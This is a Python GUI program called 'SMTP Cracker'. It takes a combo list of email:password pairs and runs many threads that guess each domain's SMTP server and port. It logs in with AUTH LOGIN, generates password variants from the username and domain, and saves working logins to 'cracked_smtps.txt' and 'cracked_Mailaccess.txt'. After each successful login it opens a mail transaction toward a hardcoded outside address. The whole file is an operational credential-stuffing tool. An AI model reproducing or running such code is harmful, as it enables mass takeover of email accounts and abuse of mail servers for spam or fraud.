import sys
import os
import socket
import threading
import base64
import datetime
import ssl
import imaplib
import time
import re
import uuid
import requests
import queue
from concurrent.futures import ThreadPoolExecutor
import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext

class SMTPCrackerApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title('SMTP Cracker')
        self.geometry('600x500')
        self.good_count = 0
        self.bad_count = 0
        self.stop_flag = threading.Event()
        self.initUI()

    def initUI(self):
        self.combo_label = tk.Label(self, text='Combo File:')
        self.combo_label.pack()

        self.combo_entry = tk.Entry(self, width=50)
        self.combo_entry.pack()

        self.combo_button = tk.Button(self, text='Browse', command=self.browse_combo_file)
        self.combo_button.pack()

        self.threads_label = tk.Label(self, text='Number of Threads:')
        self.threads_label.pack()

        self.threads_entry = tk.Entry(self)
        self.threads_entry.insert(0, "200")  # Default value
        self.threads_entry.pack()

        self.start_button = tk.Button(self, text='Start', command=self.start_cracking)
        self.start_button.pack()

        self.stop_button = tk.Button(self, text='Stop', command=self.stop_cracking)
        self.stop_button.pack()

        self.good_label = tk.Label(self, text='Good: 0', fg='green')
        self.good_label.pack()

        self.bad_label = tk.Label(self, text='Bad: 0', fg='red')
        self.bad_label.pack()

        self.log_text = scrolledtext.ScrolledText(self, state='disabled', width=70, height=20)
        self.log_text.pack()

    def browse_combo_file(self):
        filename = filedialog.askopenfilename(filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if filename:
            self.combo_entry.insert(0, filename)

    def log(self, message):
        self.log_text.config(state='normal')
        self.log_text.insert(tk.END, message + '\n')
        self.log_text.config(state='disabled')
        self.log_text.yview(tk.END)
        print(message)  # Also print to console for debugging

    def update_counters(self):
        self.good_label.config(text=f"Good: {self.good_count}")
        self.bad_label.config(text=f"Bad: {self.bad_count}")

    def increment_good(self):
        self.good_count += 1
        self.update_counters()

    def increment_bad(self):
        self.bad_count += 1
        self.update_counters()

    def start_cracking(self):
        combo_file = self.combo_entry.get()
        if not combo_file:
            messagebox.showerror("Error", "Please provide a combo file.")
            return
        try:
            thret = int(self.threads_entry.get())
        except ValueError:
            messagebox.showerror("Error", "Please provide a valid number of threads.")
            return
        self.log("Starting SMTP Cracker...")
        self.stop_flag.clear()
        self.thread = threading.Thread(target=self.crack_smtp, args=(combo_file, thret))
        self.thread.start()

    def stop_cracking(self):
        self.log("Stopping SMTP Cracker...")
        self.stop_flag.set()

    def crack_smtp(self, combo_file, thret):
        try:
            inputs = open(combo_file, 'r').read().splitlines()
        except Exception as e:
            self.log(f"Error: {str(e)}")
            return
        self.log ("Connecting ...........")
        quee = queue.Queue(maxsize=20000)
        with ThreadPoolExecutor(max_workers=thret) as executor:
            for i in range(int(thret)):
                try:
                    executor.submit(Consumer(quee, self.log, self.increment_good, self.increment_bad, self.stop_flag).run)
                except Exception as e:
                    self.log(f"Working only with {i} threads due to error: {str(e)}")
                    break
            try:
                for i in inputs:
                    if self.stop_flag.is_set():
                        break
                    user = i.split(':')[0]
                    password = i.split(':')[1]
                    user = user.lower()
                    quee.put((user.split('@')[1], user, password))
            except Exception as e:
                self.log(f"Error processing inputs: {str(e)}")
            quee.join()
        self.log("Cracking process completed.")

class Consumer(threading.Thread):
    def __init__(self, qu, log_func, increment_good, increment_bad, stop_flag):
        super().__init__()
        self.q = qu
        self.log = log_func
        self.increment_good = increment_good
        self.increment_bad = increment_bad
        self.stop_flag = stop_flag
        self.hosts = ["", "smtp.", "mail.", "webmail.", "secure.", "plus.smtp.", "smtp.mail.", "smtp.att.", "pop3.", "securesmtp.", "outgoing.", "smtp-mail.", "plus.smtp.mail.", "Smtpauths.", "Smtpauth."]
        self.ports = [587, 465, 25]
        self.timeout = 13

    def sendCmd(self, sock, cmd):
        sock.send(cmd.encode() + b"\r\n")
        return sock.recv(900000)

    def addBad(self, ip):
        global bads, rbads
        if rbads:
            bads.append(ip)
        self.increment_bad()
        return -1

    def findHost(self, host):
        self.log(f"Searching smtp host and port on {host}")
        global cache, bads, rbads
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setblocking(0)
        s.settimeout(self.timeout)
        try:
            d = cache[host]
            try:
                if self.ports[d[1]] == 465:
                    s = ssl.wrap_socket(s)
                s.connect((self.hosts[d[0]] + host, self.ports[d[1]]))
                return s
            except Exception as e:
                if rbads:
                    bads.append(host)
                return None
        except KeyError:
            pass
        cache[host] = [-1, -1]
        for i, p in enumerate(self.ports):
            for j, h in enumerate(self.hosts):
                self.log(f"Trying connection on {h}{host}:{p}")
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.setblocking(0)
                    s.settimeout(self.timeout)
                    if p == 465:
                        s = ssl.wrap_socket(s)
                    s.connect((h + host, p))
                    cache[host] = [j, i]
                    return s
                except Exception as e:
                    continue
        bads.append(host)
        del cache[host]
        return None

    def getPass(self, passw, user, domain):
        passw = str(passw)
        if '%null%' in passw:
            return ""
        elif '%user%' in passw:
            user = user.replace('-', '').replace('.', '').replace('_', '')
            return passw.replace('%user%', user)
        elif '%User%' in user:
            user = user.replace('-', '').replace('.', '').replace('_', '')
            return passw.replace('%User%', user)
        elif '%special%' in user:
            user = user.replace('-', '').replace('.', '').replace('_', '').replace('e', '3').replace('i', '1').replace('a', '@')
            return passw.replace('%special%', user)
        elif '%domain%' in passw:
            return passw.replace('%domain%', domain.replace("-", ""))
        if '%part' in passw:
            if '-' in user:
                parts = user.split('-')
            elif '.' in user:
                parts = user.split('.')
            elif '_' in user:
                parts = user.split('_')
            try:
                h = passw.replace('%part', '').split('%')[0]
                i = int(h)
                p = passw.replace('%part' + str(i) + '%', parts[i - 1])
                return p
            except Exception as e:
                return None
        return passw

    def connect(self, tupple, ssl=False):
        global bads, cracked, cache, email
        host = tupple[0].rstrip()
        host1 = host
        user = tupple[1].rstrip()
        if host1 in cracked or host1 in bads:
            return 0
        passw = self.getPass(tupple[2].rstrip(), user.rstrip().split('@')[0], host.rstrip().split('.')[0])
        if passw is None:
            return 0
        try:
            if cache[host][0] == -1:
                return 0
        except KeyError:
            pass
        s = self.findHost(host)
        if s is None:
            return -1
        port = str(self.ports[cache[host][1]])
        if port == "465":
            port += "(SSL)"
        host = self.hosts[cache[host][0]] + host
        self.log(f"Trying > {host}:{port}:{user}:{passw}")
        try:
            banner = s.recv(1024)
            if banner[0:3] != b"220":
                self.sendCmd(s, 'QUIT')
                s.close()
                return self.addBad(host1)
            rez = self.sendCmd(s, "EHLO ADMIN")
            rez = self.sendCmd(s, "AUTH LOGIN")
            if rez[0:3] != b'334':
                self.sendCmd(s, 'QUIT')
                s.close()
                return self.addBad(host1)
            rez = self.sendCmd(s, base64.b64encode(user.encode()).decode())
            if rez[0:3] != b'334':
                self.sendCmd(s, 'QUIT')
                s.close()
                return self.addBad(host1)
            rez = self.sendCmd(s, base64.b64encode(passw.encode()).decode())
            if rez[0:3] != b"235" or b'fail' in rez:
                self.sendCmd(s, 'QUIT')
                s.close()
                return 0
            self.log(f"\n[>] GENIUS!! > {host}:{port} {user} {passw}")
            with open('cracked_smtps.txt', 'a') as save:
                save.write(host + ":" + port + "," + user + "," + passw + "\n")
            with open('cracked_Mailaccess.txt', 'a') as save:
                save.write(user + ":" + passw + "\n")
            cracked.append(host1)
            self.increment_good()
            rez = self.sendCmd(s, "RSET")
            if rez[0:3] != b'250':
                self.sendCmd(s, 'QUIT')
                s.close()
                return self.addBad(host1)
            rez = self.sendCmd(s, "MAIL FROM: <" + user + ">")
            if rez[0:3] != b'250':
                self.sendCmd(s, 'QUIT')
                s.close()
                return self.addBad(host1)
            rez = self.sendCmd(s, "RCPT TO: <" + email + ">")
            if rez[0:3] != b'250':
                self.sendCmd(s, 'QUIT')
                s.close()
                return self.addBad(host1)
            rez=self.sendCmd(s,'DATA')
            rez = s.recv(1000)
            self.sendCmd(s, 'QUIT')
            s.close()
        except Exception as e:
            self.log(f"Error: {str(e)}")
            s.close()
            return self.addBad(host1)

    def run(self):
        while True:
            if self.stop_flag.is_set():
                break
            cmb = self.q.get()
            self.connect(cmb)
            self.q.task_done()

if __name__ == "__main__":
    # Initialize global variables
    tld = []
    tlds = {}
    cache = {}
    bads = []
    cracked = []
    rbads = 0
    randomString = uuid.uuid4().hex.upper()[0:7]
    email = "zinzied@protonmail.com"  # Placeholder email for testing

    app = SMTPCrackerApp()
    app.mainloop()